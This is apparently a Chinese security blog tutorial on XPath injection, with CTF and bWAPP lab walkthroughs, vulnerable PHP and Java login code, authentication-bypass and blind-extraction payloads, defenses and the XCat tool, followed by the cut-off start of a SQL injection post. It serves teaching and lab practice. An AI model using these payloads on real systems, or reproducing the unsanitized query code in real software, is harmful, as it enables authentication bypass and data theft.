XML 数据被用于用户认证，那么攻击者就可以提升他的权限。 ​ 因为xpath不存在访问控制，所以我们不会遇到许多在SQL注入中经常遇到的访问限制。XML 中没有访问控制或者用户认证，如果用户有权限使用 XPath 查询，并且之间没有防御系统或者查询语句没有被防御系统过滤，那么用户就能够访问整个 XML 文档。 注入出现的位置也就是cookie，headers，request parameters/input等。下面以登录验证中的模块为例，说明 XPath注入攻击的实现原理。 ​ 在Web 应用程序的登录验证程序中，一般有用户名（username）和密码（password） 两个参数，程序会通过用户所提交输入的用户名和密码来执行授权操作。若验证数据存放在XML文件中，其原理是通过查找user表中的用户名 （username）和密码（password）的结果来进行授权访问。 例存在user.xml文件如下： &lt;users&gt; &lt;user&gt; &lt;firstname&gt;Ben&lt;/firstname&gt; &lt;lastname&gt;Elmore&lt;/lastname&gt; &lt;loginID&gt;abc&lt;/loginID&gt; &lt;password&gt;test123&lt;/password&gt; &lt;/user&gt; &lt;user&gt; &lt;firstname&gt;Shlomy&lt;/firstname&gt; &lt;lastname&gt;Gantz&lt;/lastname&gt; &lt;loginID&gt;xyz&lt;/loginID&gt; &lt;password&gt;123test&lt;/password&gt; &lt;/user&gt; 则在XPath中其典型的查询语句如下： //users/user[loginID/text()='xyz'and password/text()='123test'] 但是，可以采用如下的方法实施注入攻击，绕过身份验证。如果用 户传入一个 login 和 password，例如 loginID = ‘xyz’ 和 password = ‘123test’，则该查询语句将返回 true。但如果用户传入类似 ’ or 1=1 or ‘’=’ 的值，那么该查询语句也会得到 true 返回值，因为 XPath 查询语句最终会变成如下代码： //users/user[loginID/text()=''or 1=1 or ''='' and password/text()='' or 1=1 or ''=''] ​ 这个字符串会在逻辑上使查询一直返回 true 并将一直允许攻击者访问系统。攻击者可以利用 XPath 在应用程序中动态地操作 XML 文档。攻击完成登录可以再通过XPath注入技术获取最高权限帐号和其它重要文档信息。延展开来，xpath的注入还有很多花样，像是通过updataxml()函数实现xpth报错注入，还有xpth的盲注。 0x06 下面动手实操(以下都是跟着佬做的) Xpath实例1 主流脚本语言都支持对XPath的处理,下面我以PHP来学习XPath注入的原理： blog.xml &lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt; &lt;root&gt; &lt;users&gt; &lt;user&gt; &lt;id&gt;1&lt;/id&gt; &lt;username&gt;admin&lt;/username&gt; &lt;password type=\"md5\"&gt;0192023a7bbd73250516f069df18b500&lt;/password&gt; &lt;/user&gt; &lt;user&gt; &lt;id&gt;2&lt;/id&gt; &lt;username&gt;jack&lt;/username&gt; &lt;password type=\"md5\"&gt;1d6c1e168e362bc0092f247399003a88&lt;/password&gt; &lt;/user&gt; &lt;user&gt; &lt;id&gt;3&lt;/id&gt; &lt;username&gt;tony&lt;/username&gt; &lt;password type=\"md5\"&gt;cc20f43c8c24dbc0b2539489b113277a&lt;/password&gt; &lt;/user&gt; &lt;/users&gt; &lt;secret&gt; &lt;flag&gt;flag{My_f1rst_xp4th_iNjecti0n}&lt;/flag&gt; &lt;/secret&gt; &lt;/root&gt; index.php &lt;?php $xml=simplexml_load_file('blog.xml'); $name=$_GET['name']; $pwd=md5($_GET['pwd']); $query= \"/root/users/user[username/text()='\".$name.\"' and password/text()='\".$pwd.\"']\"; echo $query; $result = $xml-&gt;xpath($query); if($result) { echo '&lt;h2&gt;Welcome&lt;/h2&gt;'; foreach ($result as $key =&gt; $value) { echo '&lt;br /&gt;ID:'.$value-&gt;id; echo '&lt;br /&gt;Username:'.$value-&gt;username; } } ?&gt; 代码很简单,实现了一个简单的登陆验证功能.其实和SQL注入相似,没有对用户输入的数据做过滤,导致攻击者可以直接注入”XPath表达式”，只要知道用户名就能绕过密码验证. payload: ?name=admin' or '1'='1&amp;pwd='' 如果用户名没法得知,可以用两个”or”来绕过验证逻辑 payload: ?name=fake' or '1' or '1&amp;pwd=fake Xpath实例二 这里用一道赛题来举例： &lt;?php $re = array('and','or','count','select','from','union','group','by','limit','insert','where','order','alter','delete','having','max','min','avg','sum','sqrt','rand','concat','sleep'); setcookie('injection','c3FsaSBpcyBub3QgdGhlIG9ubHkgd2F5IGZvciBpbmplY3Rpb24=',time()+100000); if(file_exists('t3stt3st.xml')) { $xml = simplexml_load_file('t3stt3st.xml'); $user=$_GET['user']; $user=str_replace($re, ' ', $user); //$user=str_replace(\"'\", \"&amp;apos\", $user); $query=\"user/username[@name='\".$user.\"']\"; $ans = $xml-&gt;xpath($query); foreach($ans as $x =&gt; $x_value) { echo $x.\": \" . $x_value; echo \"&lt;br /&gt;\"; } } ​ 通过访问/download.php?file=backup.zip下载网页源码，首先看到他过滤了sql注入的一些关键字，setcookie中有一段base64加密的密文，解码后得到的是：“sqli is not the only way for injection”，根据提示sql不是唯一的注入方式，再结合下面对xml的一系列操作，可以确定这道题是用xpath注入，于是根据$query=“user/username[@name='”.$user.“']”;这一句可构造如下payload: $query=\"user/username[@name='']|//*|ss['']\"; 这个payload中的 |ss 不太懂… 这句payload的意思是闭合了“.$user.”前后的单引号同时执行三个操作，其中第二个操作//*即是关键点，列出文档中的所有元素，最后拿到flag 浅浅分析一下:\t这里用|的原因是为了让该查询语句返回true,因为,user前后均为假,而 //* 会返回文档所有元素,因此为真 xpath 实列原理三 这边有个存放分数的xml文件： score.xml: &lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt; &lt;root&gt; &lt;class num='1'&gt; &lt;peo name='tom'&gt; &lt;subject&gt; &lt;foo&gt;english&lt;/foo&gt; &lt;score&gt;60&lt;/score&gt; &lt;/subject&gt; &lt;subject&gt; &lt;foo&gt;chinese&lt;/foo&gt; &lt;score&gt;70&lt;/score&gt; &lt;/subject&gt; &lt;password&gt;qwer123&lt;/password&gt; &lt;/peo&gt; &lt;peo name='helen'&gt; &lt;subject&gt; &lt;foo&gt;english&lt;/foo&gt; &lt;score&gt;24&lt;/score&gt; &lt;/subject&gt; &lt;subject&gt; &lt;foo&gt;chinese&lt;/foo&gt; &lt;score&gt;34&lt;/score&gt; &lt;/subject&gt; &lt;password&gt;woaichishi&lt;/password&gt; &lt;/peo&gt; &lt;peo name='vk'&gt; &lt;subject&gt; &lt;foo&gt;english&lt;/foo&gt; &lt;score&gt;100&lt;/score&gt; &lt;/subject&gt; &lt;subject&gt; &lt;foo&gt;chinese&lt;/foo&gt; &lt;score&gt;100&lt;/score&gt; &lt;/subject&gt; &lt;password&gt;vk123&lt;/password&gt; &lt;/peo&gt; &lt;/class&gt; &lt;/root&gt; 查询分数的php是： score.php &lt;?php if (file_exists('score.xml')){ $xml = simplexml_load_file('score.xml'); //获取xml文件里面的数据 if (isset($_GET['user'])){ $user = $_GET['user']; //构造语句 $en_scr = \"//peo[@name='{$user}']/subject[contains(foo, 'english')]/score\"; $ch_scr = \"//peo[@name='{$user}']/subject[contains(foo, 'chinese')]/score\"; $en_qu = $xml -&gt; xpath($en_scr); $ch_qu = $xml -&gt; xpath($ch_scr); foreach ($en_qu as $key =&gt; $value) { echo $user.':&lt;br&gt;english is '.$value; } foreach ($ch_qu as $key =&gt; $value) { echo '&lt;br&gt;'.'chinese is '.$value; } }else{ echo 'only have three user: vk, tom, helen.'; } } ?&gt; 这里，php用simplexml_load_file()这个函数来访问那个存分数的xml文件,然后用xpath语法去查询数据。会php语言的慢慢看（重要！可加深理解），不会的跳过，先看效果： 他说只有三个用户，那我们来查查helen的分数吧 好了，反过来看看代码，它是怎么实现对xml文件的查询的？ $en_scr = \"//peo[@name='{$user}']/subject[contains(foo, 'english')]/score\"; $ch_scr = \"//peo[@name='{$user}']/subject[contains(foo, 'chinese')]/score\"; 图中框这个就相当于Sql中的语句，这就是xpath路径选取xml节点的语句。 直接解释查询语句/peo 匹配到所有peo节点 这节点不止一个，到底要哪个呢？ [@name='{$user}'] 接收到用户名字，来查询相应的节点（就是刚才的helen,vk） /subject 刚才peo节点下的subject节点 这时候问题又来了，subject节点不止一个，哪个呢？ [contains(foo, 'english')] contains函数，第一个参数给出节点名，第二个写字符串意思就是，匹配出他的foo子节点中，信息含有english的那个/score 已经找到相应的subject了，然后就是找分数了。Score就是存放分数的节点： 这样就能实现从xml文件中查询相应数据了! 0x07 XPath盲注的方法 盲注主要利用XPath的一些字符串操作函数和运算符. 以前文的环境为例,如果我们想遍历出整个XML文档,一般步骤如下: 1.判断根下节点数:(体现出来的就是回显正常,以下均是) 127.0.0.1/xpath/index.php?name=1' or count(/*)=1 or '1'='1&amp;pwd=fake result: 1 2.猜解第一级节点: 127.0.0.1/xpath/index.php?name=1' or substring(name(/*[position()=1]),1,1)='r' or '1'='1&amp;pwd=fake 127.0.0.1/xpath/index.php?name=1' or substring(name(/*[position()=1]),2,1)='o' or '1'='1&amp;pwd=fake ... result: root 3.判断root的下一级节点数: 127.0.0.1/xpath/index.php?name=1' or count(/root/*)=2 or '1'='1&amp;pwd=fake result: 2 4.猜解root的下一级节点: 127.0.0.1/xpath/index.php?name=1' or substring(name(/root/*[position()=1]),1,1)='u' or '1'='1&amp;pwd=fake 127.0.0.1/xpath/index.php?name=1' or substring(name(/root/*[position()=2]),1,1)='s' or '1'='1&amp;pwd=fake result: users,secret 重复上述步骤直到猜解出所有节点，最后来猜解节点中的数据或属性值。 5、猜解id为1的user节点下的username值, 127.0.0.1/xpath/index.php?name=1' or substring(/root/users/user[id=1]/username,1,1)='a' or '1'='1&amp;pwd=fake ... result: admin 0x08 XPath攻击的实列 一般说来，大多数 Web 应用程序使用关系数据库存储和检索信息。例如，如果您的 Web 站点需要身份验证，那么您可能拥有一个 users 表，其中包含惟一 ID、登录名、密码，也许还有一些其他信息，比如角色。从 users 表中检索用户的 SQL 查询可能类似于清单 1。 清单 1从 users 表中检索用户的 SQL 查询 Select * from users where loginID=’foo’ and password=’bar’ 在这个查询中，用户必须提供 loginID 和 password 作为输入。 如果攻击者在 loginID 字段中输入：’ or 1=1 ,并在 password 中输入：’ or 1=1 则形成的查询将类似清单 2。 清单 2. 从攻击者输入形成的查询 Select * from users where loginID = ’’ or 1=1 and password=’ ’ or 1=1 这个条件会一直匹配，因此攻击者可以进入系统。 XPath 注入的原理大体类似。但是，假设您拥有的不是一个 users 表，而是一个 XML 文件，其中包含了如清单 3 所示的用户信息。 &lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt; &lt;users&gt; &lt;user&gt; &lt;firstname&gt;Ben&lt;/firstname&gt; &lt;lastname&gt;Elmore&lt;/lastname&gt; &lt;loginID&gt;abc&lt;/loginID&gt; &lt;password&gt;test123&lt;/password&gt; &lt;/user&gt; &lt;user&gt; &lt;firstname&gt;Shlomy&lt;/firstname&gt; &lt;lastname&gt;Gantz&lt;/lastname&gt; &lt;loginID&gt;xyz&lt;/loginID&gt; &lt;password&gt;123test&lt;/password&gt; &lt;/user&gt; &lt;user&gt; &lt;firstname&gt;Jeghis&lt;/firstname&gt; &lt;lastname&gt;Katz&lt;/lastname&gt; &lt;loginID&gt;mrj&lt;/loginID&gt; &lt;password&gt;jk2468&lt;/password&gt; &lt;/user&gt; &lt;user&gt; &lt;firstname&gt;Darien&lt;/firstname&gt; &lt;lastname&gt;Heap&lt;/lastname&gt; &lt;loginID&gt;drano&lt;/loginID&gt; &lt;password&gt;2mne8s&lt;/password&gt; &lt;/user&gt; &lt;/users&gt; 在 XPath 中，类似于 SQL 查询的语句如清单 4 所示。 清单 4. 匹配 SQL 查询的 XPath 语句 //users/user[loginID/text()=’abc’ and password/text()=’test123’] 要执行类似的攻击以绕过身份验证，如果攻击者在 loginID 字段中输入：’ or 1=1 并在 password 中输入：’ or 1=1 您可能会使用类似清单 5 的方法。 清单 5. 绕过身份验证 //users/user[LoginID/text()=’’ or 1=1 and password/text()=’’ or 1=1] 您可能在 Java 应用程序中有一个诸如 doLogin 之类的方法，使用清单 3 中的 XML 文档再次执行身份验证。可能类似于清单 6。 清单 6. XPathInjection.java import java.io.IOException; import org.w3c.dom.*; import org.xml.sax.SAXException; import javax.xml.parsers.*; import javax.xml.xpath.*; public class XpathInjectionExample { public boolean doLogin(String loginID, String password) throws ParserConfigurationException, SAXException,IOException, XPathExpressionException { DocumentBuilderFactory domFactory = DocumentBuilderFactory.newInstance(); domFactory.setNamespaceAware(true); DocumentBuilder builder = domFactory.newDocumentBuilder(); Document doc = builder.parse(\"users.xml\"); XPathFactory factory = XPathFactory.newInstance(); XPath xpath = factory.newXPath(); XPathExpression expr = xpath.compile(\"//users/user[loginID/text()=’\"+loginID+\"’ and password/text()=’\"+password+\"’ ]/firstname/text()\"); Object result = expr.evaluate(doc, XPathConstants.NODESET); NodeList nodes = (NodeList) result; //print first names to the console for (int i = 0; i &lt; nodes.getLength(); i++) { System.out.println(nodes.item(i).getNodeValue()); } if (nodes.getLength() &gt;= 1) { return true; }else{ return false; } } } 0x09 xpath之bwapp实例一 我们来看看bwapp上的第一个xpath注入 这个登录界面访问权限是通过xpath去读取xml文件来实现的。换句话说，你输入账号密码，他就把xml文件里的合法账号密码拿出来和你填写的进行比对，如果一致就通过。如果他对输入没有进行过滤的话用sql注入的万能钥匙是能通过的！ 通过这个我们了解到，xpath和sql注入还是有点像的，起码or能用。 进阶探索 看一道xpath注入的ctf题目： 在cookie中找到提示信息:意思是sqli不是唯一的注入-&gt;因此我们想到Xpath注入 用 user1’ or ‘’=’这样爆出所有user查询结果，并不能找到flag，看来只能拿出xpath特有的注入手段了（这也是和sql注入最大的区分）直接看exp：xmltest.php?user=user1’] | //* | //*[’ 好了，这一部分只需要了解xpath注入和sql注入不是一个东西就行。 0x10 XPath之bwapp实例二 再来看看bwapp的第二个xpath注入 这个web应用是，你给出类型，他查找这个类型的电影，给你呈现出来。这里我选了action动作片，他告诉我图中结果。看url就知道，这里是通过get来传参的。简单测试下： 语句：genre=action’ and ‘’=‘&amp;action=search没有回显，（正常应该有回显）看样子是接收参数的位置问题，不是任何位置都可以接受and or（比如在函数里）那我们试试：genre=action’ | //* | ’ &amp;action=search 继续：genre=action’] | //* | //*[’ &amp;action=search 还是不行，不要灰心，拼字游戏就是如此。 我们来看看一个查询语句：//peo[@name=‘{$user}’]/subject[contains(foo, ‘chinese’)]/score 这是之前查分数的XPath，这里接收参数的位置是在中括号里面，用来挑选某个节点属性，因此用中括号闭合成功，这里不行会不会是哪个函数里面接收参数？那就是括号！ 把中括号换成圆括号也不行。就在我郁闷的时候，一拍脑袋，函数一般是放在中括号里，用来增加查询条件的，这有点像where 那么试试：genre=action’)] | //* | //*[(’ &amp;action=search 这里对这个payload的理解: 第一个|前面啥也查不到,因此转到中间的语句,返回//* (文档中所有元素),接着又查询第三个,虽然search查不到,但前面有 //* 即://*[(‘’)]/movie,返回文档中所有movie元素 0x11 xpath挖掘利用 如果一个网站某应用程序将数据保存在XML中，并且对用户的输入没有做限制，攻击者提交了没有经过处理的输入，就插入到 XPath 查询中，即产生Xpath注入，那么就攻击者就可能通过控制查询，获取数据，或者删除数据之类的操作。 Xpath是xml路径语言，用于配置文件的查找。数据库就是xml文件。因此只要是利用XPath语法的Web 应用程序如果未对输入的XPath查询做严格的处理都会存在XPath注入漏洞。比如一些登录地址页面，搜索页面需要与xml交互的位置。 判断依据：主要根据错误信息页面判断以及查看源码进行分析。 Example：Bwapp 首先这是这个Get方式请求验证，因此对get的参数进行注入测试，发现报错信息，说明是可能通过xml存储于前端交互。 然后构造xpath查询语句//users/user[loginID/text()=‘’ and password/text()=‘’],因此’or 1=1 or ‘’=‘或者’ or ‘1’='1等使其为真可以。 Example:hctf index.html &lt;?php $re = array('and','or','count','select','from','union','group','by','limit','insert','where','order','alter','delete','having','max','min','avg','sum','sqrt','rand','concat','sleep'); setcookie('injection','c3FsaSBpcyBub3QgdGhlIG9ubHkgd2F5IGZvciBpbmplY3Rpb24=',time()+100000); if(file_exists('t3stt3st.xml')) { $xml = simplexml_load_file('t3stt3st.xml'); $user=$_GET['user']; $user=str_replace($re, ' ', $user); // $user=str_replace(\"'\", \"&amp;apos\", $user); $query=\"user/username[@name='\".$user.\"']\"; $ans = $xml-&gt;xpath($query); foreach($ans as $x =&gt; $x_value) { echo $x.\": \" . $x_value; echo \"&lt;br /&gt;\"; } } ?&gt; t3stt3et.xml &lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt; &lt;root1&gt; &lt;user&gt; &lt;username name='user1'&gt;user1&lt;/username&gt; &lt;key&gt;KEY:1&lt;/key&gt; &lt;username name='user2'&gt;user2&lt;/username&gt; &lt;key&gt;KEY:2&lt;/key&gt; &lt;username name='user3'&gt;user3&lt;/username&gt; &lt;key&gt;KEY:3&lt;/key&gt; &lt;username name='user4'&gt;user4&lt;/username&gt; &lt;key&gt;KEY:4&lt;/key&gt; &lt;username name='user5'&gt;user5&lt;/username&gt; &lt;key&gt;KEY:5&lt;/key&gt; &lt;username name='user6'&gt;user6&lt;/username&gt; &lt;key&gt;KEY:6&lt;/key&gt; &lt;username name='user7'&gt;user7&lt;/username&gt; &lt;key&gt;KEY:7&lt;/key&gt; &lt;username name='user8'&gt;user8&lt;/username&gt; &lt;key&gt;KEY:8&lt;/key&gt; &lt;username name='user9'&gt;user9&lt;/username&gt; &lt;key&gt;KEY:9&lt;/key&gt; &lt;/user&gt; &lt;hctfadmin&gt; &lt;username name='hctf1'&gt;hctf&lt;/username&gt; &lt;key&gt;flag:hctf{Dd0g_fac3_t0_k3yboard233}&lt;/key&gt; &lt;/hctfadmin&gt; &lt;/root1&gt; 通过查看源码$query，然后构造payload: ']|//*|[' 回显出flag 0x12浅谈XPath注入检测思路和方法 XML不是保存企业数据的，但是很多情况下都用来保存应用程序配置数据，小型应用程序也保存简单信息，例如角色权限等等,下面给出一个XML的列子 &lt;addressBooke&gt; &lt;address&gt; &lt;name&gt;Tom&lt;/name&gt; &lt;password&gt;abcdefg&lt;/password&gt; &lt;age&gt;20&lt;/age&gt; &lt;phone&gt;13000000000&lt;/phone&gt; &lt;/address&gt; &lt;address&gt; &lt;name&gt;Bob&lt;/name&gt; &lt;password&gt;abcdefg&lt;/password&gt; &lt;age&gt;30&lt;/age&gt; &lt;phone&gt;13000000001&lt;/phone&gt; &lt;/address&gt; &lt;address&gt; &lt;name&gt;Jack&lt;/name&gt; &lt;password&gt;abcdefg&lt;/password&gt; &lt;age&gt;40&lt;/age&gt; &lt;phone&gt;13000000002&lt;/phone&gt; &lt;/address&gt; 原理类似SQL注入，构建新的查询逻辑来进行攻击,但是要注意，关键词像函数这种的区分大小写 1.构建新的逻辑实现注入 or 1=1 and 1=2 'or 'a'='a 'and 'a'='b 一个字节一个字节的提取出信息: 'or //address[name/text()='Tom' and substring(password/text(),1,1)）] ='a' and 'a'='a 返回正常则判断正确，等同于下面的查询： //address[name/text()='' or //address[name/text()='Tom' and substring(password/text(),1,1)）] ='a' ]and 'a'='a]/phone/text() 通过查询名字的输入 却查询到了了tom的密码首位，尝试攻击每一个字符位置并测试每一个可能的值，获得密码 2.当然了大部分情况下，我们不能够知道任何节点的名称或者说只能知道一部分，可使用盲注XPath 相当于SQL盲注（大家都对语句嫩熟于心，不多提了） 首先提取父节点的名字： 'or substring(name(parent::*[position()=1]),1,1)='a 正常 'or substring(name(parent::*[position()=1]),2,1)='d 正常 ........ 父节点名字为address 是元素节点 提取子节点名字 'or substring(//address[1]/*[2],1,1)='p' or 'a'='a 正常 'or substring(//address[1]/*[2],2,1)='a' or 'a'='a 正常 ........ 二号子节点名称为password 提取子节点的值： 基于原理：//address[1]/*[2]/text() -&gt; tom的password 但是这个不会输出 我们通过布尔型来查询XML所有的内容 'or substring(//address[1]/*[2]/text(),1,1)='a' or'a'='a 正常 'or substring(//address[1]/*[2]/text(),1,1)='b' or'a'='a 正常 ...... 第二个子节点值为abcdefg 测试步骤： 提交这些看能否使得状态改变 （count返回子节点数量） ' or count(parent::*[position()=1])=0 or 'a'='b 状态1 ' or count(aprent::*[position()=1])&gt;0 or 'a'='b 状态改变 数字型参数： 1 or count(parent::*[position()=1])=0 1 or count(parent::*[position()=1])=0 状态改变 确定了存在注入点，用上面的方法注入就可以了！ 0x13 经典xpath源码 index.php： &lt;?php $re = array('and','or','count','select','from','union','group','by','limit','insert','where','order','alter','delete','having','max','min','avg','sum','sqrt','rand','concat','sleep'); setcookie('injection','c3FsaSBpcyBub3QgdGhlIG9ubHkgd2F5IGZvciBpbmplY3Rpb24=',time()+100000); if(file_exists('t3stt3st.xml')) { $xml = simplexml_load_file('t3stt3st.xml'); $user=$_GET['user']; $user=str_replace($re, ' ', $user); // $user=str_replace(\"'\", \"&amp;apos\", $user); $query=\"user/username[@name='\".$user.\"']\"; $ans = $xml-&gt;xpath($query); foreach($ans as $x =&gt; $x_value) { echo $x.\": \" . $x_value; echo \"&lt;br /&gt;\"; } } ?&gt; //t3stt3st.xml &lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt; &lt;root1&gt; &lt;user&gt; &lt;username name='user1'&gt;user1&lt;/username&gt; &lt;key&gt;KEY:1&lt;/key&gt; &lt;username name='user2'&gt;user2&lt;/username&gt; &lt;key&gt;KEY:2&lt;/key&gt; &lt;username name='user3'&gt;user3&lt;/username&gt; &lt;key&gt;KEY:3&lt;/key&gt; &lt;username name='user4'&gt;user4&lt;/username&gt; &lt;key&gt;KEY:4&lt;/key&gt; &lt;username name='user5'&gt;user5&lt;/username&gt; &lt;key&gt;KEY:5&lt;/key&gt; &lt;username name='user6'&gt;user6&lt;/username&gt; &lt;key&gt;KEY:6&lt;/key&gt; &lt;username name='user7'&gt;user7&lt;/username&gt; &lt;key&gt;KEY:7&lt;/key&gt; &lt;username name='user8'&gt;user8&lt;/username&gt; &lt;key&gt;KEY:8&lt;/key&gt; &lt;username name='user9'&gt;user9&lt;/username&gt; &lt;key&gt;KEY:9&lt;/key&gt; &lt;/user&gt; &lt;hctfadmin&gt; &lt;username name='hctf1'&gt;hctf&lt;/username&gt; &lt;key&gt;flag:hctf{Dd0g_fac3_t0_k3yboard233}&lt;/key&gt; &lt;/hctfadmin&gt; &lt;/root1&gt; 从index.php源码可知XPath查询语句为$query=“user/username[@name='”.$user.“']”， 且$user经过关键字替换。但是黑名单$re中都为SQL关键字，所以并不影响对XPath进行注入。我们可以构造payload如 ']|//*|zzz['来进行注入，获取文档中的所有元素节点。 0x14 xpath危害 在URL及表单中提交恶意XPath代码，可获取到权限限制数据的访问权，并可修改这些数据； 可通过此类漏洞查询获取到系统内部完整的XML文档内容。 逻辑以及认证被绕过，它不像数据库那样有各种权限，xml没有各种权限的概念,正因为没有权限概念，因此利用xpath构造查询的时候整个数据库都会被用户读取。 xpath的具体危害： 下面我将从这两个方面来分别演示这两种危害。 （1）绕过验证 首先这里有一个登录身份验证的程序，所有的身份数据都存储在一个名为 UsersDataBase.xml 的文件里。 通过 XPath 查询 xml 文件，将用户提交的用户名和密码与 xml 文件中的用户名密码做比对来验证身份。 UsersDataBase.xml 的结构如下： 一般情况下，输入错误的用户名或密码会导致身份认证失败： 然而在后台的身份认证程序中有这样一句 XPath 查询语句 $xpath = “//users/user[username/text()='”.$_POST[“username”].“’ and password/text()='”.$_POST[“password”].“']”; 可以看到在 XPath 查询语句中并未对用户的输入做任何处理，这就直接导致一个注入点 我们可以构造如下的 payload: Username: ’ or ‘1’ = '1 Password: ’ or ‘1’ = '1 那么整个 XPath 查询语句就变成了这个样子 $xpath = “//users/user[username/text()=‘’ or ‘1’ = ‘1’ and password/text()=‘’ or ‘1’ = ‘1’]”; 整个查询语句恒成立，就直接导致了身份认证被绕过。 2.信息泄露 大多数情况下，当服务器返回数据时，都会对这些数据做一些处理。比如如果服务器返回一些错误信息，那么最终会被过滤掉，不会出现在用户的页面里。将尽可能少的信息暴露给用户，将可以提高安全性。但是即使错误信息被过滤掉，我们依然可以从服务器给出的不同返回结果推测出服务器做出了何种响应。作为攻击者可以提交一段包含 XPath 函数的 Payload，通过服务器给出的不同响应，判断得到我们想知道的信息。这就是 XPath 盲注。 下面这是一个通过用户名的ID来得到用户名的程序。当然具体场景也可能是通过名字来查询身份证号码等等，这里只做演示。 正常情况下，输入用户的 ID，就会得到相应的用户名。当查询语句恒成立时（如构造 Payload 为’ or ‘1’ = '1 时），就会返回第一个节点的用户名 “Alice”（这是程序本身的 bug ）。而当查询语句错误或该 ID 在 xml 数据库中不存在时，就什么都不返回。 利用这点，我们就可以构造如下 Payload，比如：来查询整个 xml 文档的根节点的第一个字母是否为“u” ’ or substring(name(parent::*[position()=1]),1,1)='u 返回结果为 “Alice”，就说明整个 xml 文档的根节点的第一个字母是 “u”，反之如果什么都没有返回，则说明根节点的第一个字母不是 “u”。以此类推，我们就可以历遍整个 xml 文档了。这也是 xml和其他数据库相比最大的威胁所在了，因为它没有访问控制和身份验证。 0x15 xpath防御 数据提交到服务器上端，在服务端正式处理这批数据之前，对提交数据的合法性进行验证。 检查提交的数据是否包含特殊字符，对特殊字符进行编码转换或替换、删除敏感字符或字符串，如过滤[] ‘ “ and or 等全部过滤，像单双引号这类，可以对这类特殊字符进行编码转换或替换 对于系统出现的错误信息，以IE错误编码信息替换，屏蔽系统本身的出错信息或者用统一的报错页面代替（如updataxml()这类） 参数化XPath查询，将需要构建的XPath查询表达式，以变量的形式表示，变量不是可以执行的脚本。如下代码可以通过创建保存查询的外部文件使查询参数化： declare variable $loginID as xs：string external； declare variable $password as xs：string external； //users/user[@loginID=$loginID and@password= $password] 通过MD5、SSL等加密算法，对于数据敏感信息和在数据传输过程中加密，即使某些非法用户通过非法手法获取数据包，看到的也是加密后的信息。 验证是否包含特定的 XPath 函数，可以过滤掉一些 XPath 函数，以提高安全性，当然了不能以牺牲用户体验或影响用户正常使用为前提。 总结下就是：限制提交非法字符，对输入内容严格检查过滤，参数化XPath查询的变量 0x16 xpath工具 XCat XCat是一个用来利用XPath盲注的命令行程序。它可以用来检索正在被易受攻击的XPath查询处理的整个XML文档，读取主机文件系统上的任意文件，并利用无限制的HTTP请求使服务器直接向xcat发送数据(OOB带外通信) Xcat是python的命令行程序利用Xpath的注入漏洞在Web应用中检索XML文档,下载地址：https://github.com/orf/xcat 使用说明：http://xcat.readthedocs.io/en/latest/#about-xcat python3.4.1环境: pip install xcat 常用命令读取xml文件：(这命令老了,我现在也不知道现版本咋用,有时间研究吧…) xcat.py --method=GET --public-ip=“192.168.91.139” http://192 .168.91.139/xml/example2.php name=hacker name “Hello hacker” run retrieve Xpath注入","categories":["常见top漏洞"]},{"title":"浅析sql注入","path":"/2023/08/06/qian-xi-sql-zhu-ru/","content":"SQL注入总结 sql的注入可以分为数字类型，字符类型。 方法1： 首先我们可以使用(转义字符)来判断SQL注入的闭合方式。 原理，当闭合字符遇到转义字符时，会被转义，那么没有闭合符的语句就不完整了，就会报错，通过报错信息我们就可以推断出闭合符。 分析报错信息：看\\斜杠后面跟着的字符，是什么字符，它的闭合字符就是什么，若是没有，就为数字型。 方法2： 首先尝试： ?id=1’ ?id=1” 结果一：如果都报错 判断闭合符为：整形闭合。 '1\"' 结果二：如果单引号报错，双引号不报错。 继续尝试 ?id=1’ –-+ 结果1：无报错 判断闭合符为：单引号闭合。 结果2：报错 判断闭合符可能为：单引号加括号。 结果三：如果单引号不报错，双引号报错。 继续尝试 ?id=1\" -–+ 结果1：结果无报错 判断闭合符为：双引号闭合。 结果2：报错 判断闭合符可能为：双引号加括号。 注意：这里的括号不一定只有一个，闭合符里是允许多个括号组合成闭合符的，具体要判断有多少个括号，可以使用二分法来快速判断。 判断是否存在注入点 通过\\ 或者 and1=1 and 1=2 and sleep(3) 查看页面状态 之类的凭感觉是否有注入，有的话判断闭合方式 判断闭合方式 常规闭合' ') ')) \" \") \")) 奇葩闭合方式 一个) 和两个 )) 通过and 1=1 和and 1=2 来判断是否执行了我们输入的语句 靶场经验（我会经常通过 ' and sleep(3) --+ 延时判断来闭合，个人习惯，然后一步一步找闭合方式，只要能闭合成功，其它都好说） 0x01 什么是SQLI 所谓SQL注入就是用户在能够控制SQL查询、更新、插入、删除等语句的参数的情况下，攻击者通过构造特殊的输入字符串使后端程序错误地识别SQL查询语句中的代码与数据部分从而导致数据库管理系统输出了非预期的结果的一种行为。 SQL注入本质上来讲就是拼接字符串，通过输入额外的信息破坏外后端脚本原有的查询语句结构，从而达成注入的目的。 攻击者构造的查询参数在SQL语句中没有被当作一个字符串对待，而是具有了实际的功能特性，这是PHP的语法决定的，它只是简单地将用户的输入与后端预定义的语句做了一个拼接，将拼接的结果整体作为一条SQL的查询语句。正是这个特性导致了SQL注入的产生. 0x02 sql注入的产生 注: web程序结构 三层架构(3-tier architecture) 通常意义上就是将整个业务应用划分为： 界面层（User Interface layer） 业务逻辑层（Business Logic Layer） 数据访问层（Data access layer） 用户能够直接使用的都是在表示层，在表示层输入自己要访问的内容，输入的内容传递到业务逻辑层进行处理，并将处理后的数据写入到数据库中。 同理需要请求的内容从数据库中查询出来后在业务逻辑层进行业务逻辑处理，之后呈现在表示层。 以上两步就是一个正常的请求和响应过程。 sql注入就是因为业务逻辑层没有做安全过滤，到时了从表示层传递过来的数据修改了正常的sql语句结构，从而达到了黑客自身的攻击目的。 2.1 字符型注入 当我们传入的参数在后端代码中被引号引起来的时候，我们称这种情况为字符型注入 看下面的例子（字符型注入） $query=\"select name,age,gender from t_students where id='{$_GET['id']}'\"; 字符型注入最关键的是如何闭合SQL语句以及注释多余的代码。 注：数据库不同，字符串连接符不同， SQL server的连接符为“+”，Oracle连接符为“||”，MySQL连接符为空格 2.2 数字型注入 我们传入的参数在后端代码中没有被引起来的时候，我们称这种情况为数字型注入。当然之后参数类型为数字的时候，才存在区分数字型和字符型的情况 $query=\"select name,age,gender from t_students where id={$_GET['id']}\"; 此时我们传入的参数直接与id进行比较 进行sql注入的首要操作就是对注入类型进行判断，即对sql语句的闭合方式进行判断 0x03 按照请求方法分 3.1 GET型注入 